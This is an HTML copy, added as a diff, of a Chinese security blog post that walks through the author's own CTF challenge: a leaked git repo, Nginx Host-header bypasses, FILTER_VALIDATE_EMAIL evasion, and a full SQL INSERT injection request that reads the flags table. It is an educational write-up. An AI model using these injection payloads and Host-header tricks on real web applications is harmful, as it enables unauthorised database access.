@@ -1,0 +1,861 @@
+
+
+<html class="no-js">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
+    <title>攻击LNMP架构Web应用的几个小Tricks | 离别歌</title>
+    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
+    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
+    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
+    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
+    
+<style>div.row .col-xs-4 {
+  float: left;
+  margin-left: 4px;
+}
+div.row .col-xs-4 img {
+  margin-left: 5px;
+}
+</style>
+<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
+<link rel="stylesheet" href="../static/deep/css/code.css">
+
+</head>
+<body>
+<!--[if lt IE 8]>
+    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
+<![endif]-->
+<div id="header">
+    <div class="container">
+        <h1 class="h1-title">
+            <a href="../index.html">
+               <img src="../static/deep/images/logo.png" alt="离别歌" />
+            </a>
+        </h1>
+        <div id="nav">
+        <input type="checkbox" id="button">
+        <label for="button" onclick>菜单</label>
+        
+        <ul>
+            
+            <li class="item ">
+                <a href="../index.html" >首页</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../list/index.html" >文章</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/tinger.html" >关于</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/friends-link.html" >友链</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://github.com/phith0n" target="_blank" >项目</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
+            </li>
+            
+        </ul>
+        
+        </div>
+    </div>
+</div>
+
+<div class="banner-bar">
+    <div class="container">
+        <div class="col-12 columns">
+            <div class="place">
+                <a href="../index.html">首页</a>
+                &raquo;
+                
+                网络安全 &raquo; <a href="some-tricks-of-attacking-lnmp-web-application.html">攻击LNMP架构Web应用的几个小Tricks</a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<div class="container">
+    <div class="col-11 columns" id="mainbody" role="main">
+        <div class="post-single type-post">
+            <h1 class="article-h1">攻击LNMP架构Web应用的几个小Tricks</h1>
+            <div class="details-up">
+  <span class="author">作者: phithon</span>
+  
+  <span class="category">分类: <a href="../sort/PENETRATION.html">网络安全</a></span>
+  
+  <span class="date">时间: 2018-2-20 14:12</span>
+  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">16条评论</a></span>
+  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="some-tricks-of-attacking-lnmp-web-application.html">48727人看过</a></span>
+  
+  <span class="date">标签:
+    
+        <a href="../tag/ctf.html">ctf</a>
+    
+        <a href="../tag/lnmp.html">lnmp</a>
+    
+  </span>
+  
+</div>
+            <div class="entry">
+                <p>农历新年初一，我在<a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html">代码审计知识星球</a>分享了一个红包，但领取红包的条件是破解我出的一道代码审计相关题目，题干如下：</p>
+<blockquote>
+<p>2018.mhz.pw:62231</p>
+</blockquote>
+<h2 id="0x01"><a class="toclink" href="#0x01">0x01 拉取源码</a></h2>
+<p>题干比较简单，我们用浏览器打开，发现提示<code>ERR_INVALID_HTTP_RESPONSE</code>，说明这个端口并非HTTP服务。用nmap进行端口指纹识别：</p>
+<div class="codehilite"><pre><span></span>nmap -sV -p 62231 2018.mhz.pw
+</pre></div>
+
+
+<p><a href="../media/attachment/2018/02/20/a763c5e8-ec97-4424-ba37-e6c1d5ccac97.jpg"><img alt="15190539687211.jpg" src="../media/attachment/2018/02/20/a763c5e8-ec97-4424-ba37-e6c1d5ccac97.e0b1509d5c0e.jpg" /></a></p>
+<p>可见，这是一个rsync服务，我们使用rsync命令查看目录，发现只有一个目录，名为<code>pwnhub_6670.git</code>，将其拉取下来：</p>
+<p><a href="../media/attachment/2018/02/20/740189b6-13df-4519-b8fc-2dc53bcb97fa.jpg"><img alt="15190541067152.jpg" src="../media/attachment/2018/02/20/740189b6-13df-4519-b8fc-2dc53bcb97fa.ffbe35cad4cf.jpg" /></a></p>
+<p>查看<code>pwnhub_6670.git</code>目录，发现这是一个git裸仓库（<a href="http://www.saintsjd.com/2011/01/what-is-a-bare-git-repository/">git bare repository</a>）。</p>
+<p>Git裸仓库怎么还原呢？其实非常简单，我们平时用的Github、Gitlab上存的所有仓库其实都是裸仓库，比如我们拉取vulhub的源码，执行<code>git clone https://github.com/vulhub/vulhub.git</code>，其中<code>vulhub.git</code>其实就是Github服务器上的一个裸仓库。可见，裸仓库一般以”项目名称.git“为名。</p>
+<p>Git支持通过本地文件、SSH、HTTPS或GIT协议拉取信息。我们既然已经用rsync将裸仓库下载到本地了，所以只需要<code>git clone pwnhub_6670.git</code>即可将裸仓库拉取下来，成为一个标准的仓库：</p>
+<p><a href="../media/attachment/2018/02/20/3094d63b-7c5b-432d-86f5-1ffb704f6324.jpg"><img alt="15190547400346.jpg" src="../media/attachment/2018/02/20/3094d63b-7c5b-432d-86f5-1ffb704f6324.fd73fd4bf0e8.jpg" /></a></p>
+<p>仓库<code>pwnhub_6670</code>文件夹下的内容就是我们需要审计的源代码。</p>
+<h2 id="0x02-sql"><a class="toclink" href="#0x02-sql">0x02 SQL注入漏洞挖掘</a></h2>
+<p>作为一个出题人，我耍了点小阳谋。我用了一个叫<a href="https://github.com/SpeedPHP/speed">speed</a>的小众PHP框架，但改了核心文件名为<code>core.php</code>。就是为了防止大家去找这个框架本身的漏洞导致走偏方向，所有有漏洞的代码都出在我写的代码中。</p>
+<p>拿到源码仓库，第一步先看看<code>git log</code>和branch、tags等信息，也许会暴漏一些目标的敏感信息。这里没有，于是我们就应该把目标放向代码本身。</p>
+<p>目标网站<code>http://2018.mhz.pw</code>只有简单的注册、登录功能，有关输入的代码如下：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nx">escape</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">);</span>
+<span class="nx">escape</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
+<span class="nx">escape</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
+
+<span class="k">function</span> <span class="nf">escape</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$arg</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$arg</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arg</span> <span class="k">as</span> <span class="o">&amp;</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">escape</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$arg</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">([</span><span class="s2">&quot;&#39;&quot;</span><span class="p">,</span> <span class="s1">&#39;\\&#39;</span><span class="p">,</span> <span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;)&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s2">&quot;‘&quot;</span><span class="p">,</span> <span class="s1">&#39;\\\\&#39;</span><span class="p">,</span> <span class="s1">&#39;（&#39;</span><span class="p">,</span> <span class="s1">&#39;）&#39;</span><span class="p">],</span> <span class="nv">$arg</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">arg</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$default</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$trim</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$name</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nv">$arg</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$name</span><span class="p">];</span>
+    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nv">$name</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nv">$arg</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="nv">$name</span><span class="p">];</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$arg</span> <span class="o">=</span> <span class="nv">$default</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$trim</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$arg</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$arg</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$arg</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>escape是将GPR中的单引号、圆括号转换成中文符号，反斜线进行转义；arg是获取用户输入的<code>$_REQUEST</code>或<code>$_SERVER</code>。显然，这里<code>$_SERVER</code>变量没有经过转义，先记下这个点。</p>
+<p>全局没其他值得注意的地方了，所以开始看controller的代码。</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">actionRegister</span><span class="p">(){</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$username</span> <span class="o">=</span> <span class="nx">arg</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">);</span>
+        <span class="nv">$password</span> <span class="o">=</span> <span class="nx">arg</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$password</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="s1">&#39;Username or password is empty.&#39;</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="nv">$email</span> <span class="o">=</span> <span class="nx">arg</span><span class="p">(</span><span class="s1">&#39;email&#39;</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$email</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$username</span> <span class="o">.</span> <span class="s1">&#39;@&#39;</span> <span class="o">.</span> <span class="nx">arg</span><span class="p">(</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_EMAIL</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="s1">&#39;Email error.&#39;</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
+        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM `</span><span class="si">{</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">table_name</span><span class="si">}</span><span class="s2">` WHERE `username` = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;&quot;</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="s1">&#39;This username is exists.&#39;</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">create</span><span class="p">([</span>
+            <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="nv">$username</span><span class="p">,</span>
+            <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">),</span>
+            <span class="s1">&#39;email&#39;</span> <span class="o">=&gt;</span> <span class="nv">$email</span>
+        <span class="p">]);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">lastInsertId</span><span class="p">();</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="s1">&#39;Unknown error.&#39;</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+</pre></div>
+
+
+<p>以上是注册功能的代码，比较简单。用户名和密码是必填项，邮箱如果没有填写，则自动设置为”用户名@网站域名“。最后将三者传入create方法，create方法其实就是拼接了一个INSERT语句。</p>
+<p>值得注意的是，网站域名是从<code>arg('HTTP_HOST')</code>中获取，也就是从<code>$_REQUEST</code>或<code>$_SERVER</code>中获取。因为<code>$_SERVER</code>没有经过转义，我们只需要在HTTP头Host值中引入单引号，即可造成一个SQL注入漏洞。</p>
+<p>但email变量经过了<code>filter_var($email, FILTER_VALIDATE_EMAIL)</code>的检测，我们首先要绕过之。</p>
+<h2 id="0x03-filter_validate_email"><a class="toclink" href="#0x03-filter_validate_email">0x03 <code>FILTER_VALIDATE_EMAIL</code>绕过</a></h2>
+<p>这就是今天第一个trick。这个点早在当初PHPMailer的<a href="PHPMailer-CVE-2016-10033.html">CVE-2016-10033</a>就提到过。</p>
+<p>RFC 3696规定，邮箱地址分为local part和domain part两部分。local part中包含特殊字符，需要如下处理：</p>
+<ol>
+<li>将特殊字符用<code>\</code>转义，如<code>Joe\'Blow@example.com</code></li>
+<li>或将local part包裹在双引号中，如<code>"Joe'Blow"@example.com</code></li>
+<li>local part长度不超过64个字符</li>
+</ol>
+<p>虽然PHP没有完全按照RFC 3696进行检测，但支持上述第2种写法。所以，我们可以利用之绕过<code>FILTER_VALIDATE_EMAIL</code>的检测。</p>
+<p>因为代码中邮箱是用户名、@、Host三者拼接而成，但用户名是经过了转义的，所以单引号只能放在Host中。我们可以传入用户名为<code>"</code>，Host为<code>aaa'"@example.com</code>，最后拼接出来的邮箱为<code>"@aaa'"@example.com</code>。</p>
+<p>这个邮箱是合法的：</p>
+<p><a href="../media/attachment/2018/02/20/c99fb7d6-6173-47b5-a213-ed97cfe984c8.jpg"><img alt="15190588848420.jpg" src="../media/attachment/2018/02/20/c99fb7d6-6173-47b5-a213-ed97cfe984c8.56524021cd22.jpg" /></a></p>
+<p>这个邮箱包含单引号，将闭合SQL语句中原本的单引号，造成SQL注入漏洞。</p>
+<h2 id="0x04-nginx-host"><a class="toclink" href="#0x04-nginx-host">0x04 绕过Nginx Host限制</a></h2>
+<p>这是今天第二个trick。</p>
+<p>我们尝试向目标注册页面发送刚才构造好的用户名和Host：</p>
+<p><a href="../media/attachment/2018/02/20/ee68755f-cbc5-4455-b8d2-6cb1b26f9a4c.jpg"><img alt="15190591584407.jpg" src="../media/attachment/2018/02/20/ee68755f-cbc5-4455-b8d2-6cb1b26f9a4c.e5c5b2be1b86.jpg" /></a></p>
+<p>直接显示404，似乎并没有进入PHP的处理过程。</p>
+<p>这就回到问题的本质了，Host头究竟是做什么的？</p>
+<p>众所周知，如果我们在浏览器里输入<code>http://2018.mhz.pw</code>，浏览器将先请求DNS服务器，获取到目标服务器的IP地址，之后的TCP通信将和域名没有关系。那么，如果一个服务器上有多个网站，那么Nginx在接收到HTTP包后，将如何区分？</p>
+<p>这就是Host的作用：用来区分用户访问的究竟是哪个网站（在Nginx中就是Server块）。</p>
+<p>如果Nginx发现我们传入的Host找不到对应的Server块，将会发送给默认的Server块，也就是我们通过IP地址直接访问的那个Nginx默认页面：</p>
+<p><a href="../media/attachment/2018/02/20/d1e480b6-6d19-4977-9830-967de376c22e.jpg"><img alt="15190596270561.jpg" src="../media/attachment/2018/02/20/d1e480b6-6d19-4977-9830-967de376c22e.cbd0d7f4e8fb.jpg" /></a></p>
+<p>默认网站并没有<code>/main/register</code>这个请求的处理方法，所以自然会返回404。</p>
+<p>这里给出解决这个问题的两个方法，也许还有更多新方法我没有想到，欢迎补充。</p>
+<h3 id="1"><a class="toclink" href="#1">法1</a></h3>
+<p>Nginx在处理Host的时候，会将Host用冒号分割成hostname和port，port部分被丢弃。所以，我们可以设置Host的值为<code>2018.mhz.pw:xxx'"@example.com</code>，这样就能访问到目标Server块：</p>
+<p><a href="../media/attachment/2018/02/20/d3ea0303-2829-4be5-90c4-8eb48be82cd9.jpg"><img alt="15190606828564.jpg" src="../media/attachment/2018/02/20/d3ea0303-2829-4be5-90c4-8eb48be82cd9.bdc4dfdd5131.jpg" /></a></p>
+<p>如上图，成功触发SQL报错。</p>
+<h3 id="2"><a class="toclink" href="#2">法2</a></h3>
+<p>当我们传入两个Host头的时候，Nginx将以第一个为准，而PHP-FPM将以第二个为准。</p>
+<p>也就是说，如果我传入：</p>
+<div class="codehilite"><pre><span></span><span class="n">Host</span><span class="o">:</span> <span class="mi">2018</span><span class="o">.</span><span class="na">mhz</span><span class="o">.</span><span class="na">pw</span>
+<span class="n">Host</span><span class="o">:</span> <span class="n">xxx</span><span class="err">&#39;&quot;@</span><span class="n">example</span><span class="o">.</span><span class="na">com</span>
+</pre></div>
+
+
+<p>Nginx将认为Host为<code>2018.mhz.pw</code>，并交给目标Server块处理；但PHP中使用<code>$_SERVER['HTTP_HOST']</code>取到的值却是<code>xxx'"@example.com</code>。这样也可以绕过：</p>
+<p><a href="../media/attachment/2018/02/20/6b2e4a08-0436-40c2-a835-60be44b8e8e4.jpg"><img alt="15190608786400.jpg" src="../media/attachment/2018/02/20/6b2e4a08-0436-40c2-a835-60be44b8e8e4.0a3ac76105eb.jpg" /></a></p>
+<p>这个方法我以前在某群里提到过，只有Nginx+PHP会出现这个问题，Apache的情况下将会是另一个样子，此处不展开讨论。</p>
+<h2 id="0x05-mysql-57-insert"><a class="toclink" href="#0x05-mysql-57-insert">0x05 Mysql 5.7 INSERT注入方法</a></h2>
+<p>这是今天第三个trick。</p>
+<p>既然已经触发了SQL报错，说明SQL注入近在眼前。通过阅读源码中包含的SQL结构，我们知道flag在flags表中，所以不废话，直接注入读取该表。</p>
+<h3 id="_1"><a class="toclink" href="#_1">插入显示位</a></h3>
+<p>因为用户成功登录后，将会显示出该用户的邮箱地址，所以我们可以将数据插入到这个位置。发送如下数据包：</p>
+<div class="codehilite"><pre><span></span><span class="nf">POST</span> <span class="nn">/main/register</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">2018.mhz.pw</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">&#39;),(&#39;t123&#39;,md5(12123),(select(flag)from(flags)))#&quot;@a.com</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=--------356678531</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">176</span>
+
+----------356678531
+Content-Disposition: form-data; name=&quot;username&quot;
+
+&quot;a
+----------356678531
+Content-Disposition: form-data; name=&quot;password&quot;
+
+aaa
+----------356678531--
+</pre></div>
+
+
+<p>可见，我闭合了INSERT语句，并插入了一个新用户<code>t123</code>，并将flag读取到email字段。登录该用户，获取flag：</p>
+<p><a href="../media/attachment/2018/02/20/7ddc6542-5f28-415d-b153-1925ecf7cb45.jpg"><img alt="15190615665771.jpg" src="../media/attachment/2018/02/20/7ddc6542-5f28-415d-b153-1925ecf7cb45.9e327f6dfbad.jpg" /></a></p>
+<p>flag是支付宝红包口令。:)</p>
+<h3 id="_2"><a class="toclink" href="#_2">报错注入</a></h3>
+<p>为了降低难度，我特地给出了Mysql的报错信息，没想到居然还增加了难度，这一点我没考虑到，还是 @burnegg 同学提出来的解决方法。</p>
+<p>很多同学上来就测试报错注入，但这里有两个需要绕过的坑：</p>
+<ol>
+<li>由于邮箱的限制，注入语句长度需要小于64位</li>
+<li>Mysql 5.7 默认开启严格模式，部分字符串连接语法将导致错误：<code>ErrorInfo: Truncated incorrect INTEGER value</code></li>
+</ol>
+<p>我们可以不使用字符串连接语法，而使用<code>&lt;</code>、<code>&gt;</code>、<code>=</code>等比较符号来触发漏洞：</p>
+<p><a href="../media/attachment/2018/02/20/81a89362-f875-4c7d-b48b-1f3bdaa10d6b.jpg"><img alt="15190631626996.jpg" src="../media/attachment/2018/02/20/81a89362-f875-4c7d-b48b-1f3bdaa10d6b.83b87208c757.jpg" /></a></p>
+<p>更多INSERT注入相关内容，可以阅读<a href="https://www.exploit-db.com/docs/english/41275-mysql-injection-in-update,-insert,-and-delete.pdf">MySQL Injection in Update, Insert and Delete</a>。</p>
+<h2 id="0x06"><a class="toclink" href="#0x06">0x06 一个总结</a></h2>
+<p>题目出出来以后，有千余同学参加，最快拿到支付宝红包的是 @超威蓝猫 ，大概在初二凌晨1点。</p>
+<p>除了安全研究者以外，有一些程序员同学也参与了游戏，但因为不熟悉CTF比赛和安全相关漏洞，所以有的人跑偏了，没有聚焦在漏洞和安全技术本身，而去猜测红包口令是否藏在图片或者其他什么地方。</p>
+<p>希望这次游戏给你带来不仅是过年的欢乐，而且有技术的提升~</p>
+            </div>
+            <div itemprop="keywords" class="tags-meta">
+                标签:
+                
+                    <a href="../tag/ctf.html">ctf</a>
+                
+                    <a href="../tag/lnmp.html">lnmp</a>
+                
+            </div>
+            <br>
+<!--MOB SHARE BEGIN-->
+<div class="-mob-share-ui-button -mob-share-open">分享</div>
+<div class="-mob-share-ui" style="display: none">
+    <ul class="-mob-share-list">
+        <li class="-mob-share-weibo"><p>新浪微博</p></li>
+        <li class="-mob-share-qzone"><p>QQ空间</p></li>
+        <li class="-mob-share-qq"><p>QQ好友</p></li>
+        <li class="-mob-share-weixin"><p>微信</p></li>
+        <li class="-mob-share-douban"><p>豆瓣</p></li>
+        <li class="-mob-share-facebook"><p>Facebook</p></li>
+        <li class="-mob-share-twitter"><p>Twitter</p></li>
+        <li class="-mob-share-pocket"><p>Pocket</p></li>
+        <li class="-mob-share-google"><p>Google+</p></li>
+        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
+        <li class="-mob-share-mingdao"><p>明道</p></li>
+        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
+        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
+        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
+    </ul>
+    <div class="-mob-share-close">取消</div>
+</div>
+<div class="-mob-share-ui-bg"></div>
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
+<!--MOB SHARE END-->
+
+        <div class="qqlist">
+          <h3>订阅本站<small>(RSS)</small></h3>
+          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
+          <input type="hidden" value="qf_booked_feedback" name="t" />
+          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
+          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
+          <button type="submit" >订阅&rarr;</button>
+          </form>
+        </div>
+
+
+        </div>
+
+        
+        <div class="post-single type-post text-center">
+            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
+            <img src="../static/wx.jpg" width="280" alt="">
+        </div>
+        
+
+        <!-- 评论位置 -->
+        <div id="comments" class="comments">
+          <h3>已有 16 条评论</h3>
+            <ol class="comment-list">
+            
+            
+              <li class="comment-body" id="comment-3273">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">e</a></div>
+                    <p>为什么我设置Host的时候 ：后面如果有字符和两个Host都会返回400错误，Nginx</p>
+                    <span class="comment-time">时间: 2019-01-05 20:25</span>
+                    <span class="comment-reply"><a href="#comment-3273" onclick="reply_to('3273','e')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3143">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/32aec855af00c965d1bb6fb661dc82f0.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="https://www.pangookj.com" target="_blank" rel="nofollow noopener">天津网站建设</a></div>
+                    <p>感谢分享</p>
+                    <span class="comment-time">时间: 2018-09-16 21:02</span>
+                    <span class="comment-reply"><a href="#comment-3143" onclick="reply_to('3143','天津网站建设')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3117">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/382557240dc7a23aafbc79ca9ae722d7.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="https://www.zhoulujun.cn/" target="_blank" rel="nofollow noopener">周陆军</a></div>
+                    <p>我的网站采用lnmp架构，用phpcms，发现类似的漏洞蛮多。现在没有时间整理。只要用腾讯云CDN做初步拦截。<br>phpcms 博主貌似没有挖掘这个系统的漏洞</p>
+                    <span class="comment-time">时间: 2018-07-23 11:35</span>
+                    <span class="comment-reply"><a href="#comment-3117" onclick="reply_to('3117','周陆军')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3041">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">panzer</a></div>
+                    <p>Hi leavesong, I found a 注入漏洞 in a django website. Could you add me on Wire? My username is `reversebrain`. The vuln could potentially worth millions of dollars:)</p>
+                    <span class="comment-time">时间: 2018-03-09 10:23</span>
+                    <span class="comment-reply"><a href="#comment-3041" onclick="reply_to('3041','panzer')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3044">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@panzer Sorry I don&#x27;t use Wire, you could contact me via my email (root#leavesongs.com). And I&#x27;m not interesting in money, you can talk to me about technology or tricks.</p>
+                    <span class="comment-time">时间: 2018-03-09 15:06</span>
+                    <span class="comment-reply"><a href="#comment-3044" onclick="reply_to('3044','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3131">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/7080fa6b676c6109dff4847f45ffb305.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">白猫</a></div>
+                    <p>太厉害了</p>
+                    <span class="comment-time">时间: 2018-09-03 17:15</span>
+                    <span class="comment-reply"><a href="#comment-3131" onclick="reply_to('3131','白猫')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3040">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">sunu11</a></div>
+                    <p>学习了，多谢博主</p>
+                    <span class="comment-time">时间: 2018-03-07 12:45</span>
+                    <span class="comment-reply"><a href="#comment-3040" onclick="reply_to('3040','sunu11')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3038">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/d26a509d85b171abe0beee2e98c4455b.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">dot</a></div>
